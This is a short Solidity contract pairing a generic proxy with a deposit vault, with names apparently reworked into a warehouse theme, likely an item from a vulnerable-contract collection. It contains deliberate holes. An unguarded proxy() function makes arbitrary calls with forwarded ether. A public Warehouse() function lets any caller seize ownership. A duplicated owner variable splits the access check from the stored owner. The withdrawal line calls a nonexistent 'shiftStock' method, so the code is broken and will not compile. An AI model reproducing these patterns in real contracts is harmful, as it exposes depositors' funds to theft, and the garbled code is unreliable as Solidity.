pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyFacilityoperator { if (msg.sender == WarehouseManager) _; } address WarehouseManager = msg.sender;
    function relocatecargoDepotowner(address _logisticsadmin) public onlyFacilityoperator { WarehouseManager = _logisticsadmin; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract StoragevaultProxy is Proxy {
    address public WarehouseManager;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Warehouse() public payable {
        if (msg.sender == tx.origin) {
            WarehouseManager = msg.sender;
            checkInCargo();
        }
    }

    function checkInCargo() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function releaseGoods(uint256 amount) public onlyFacilityoperator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shiftStock(amount);
        }
    }
}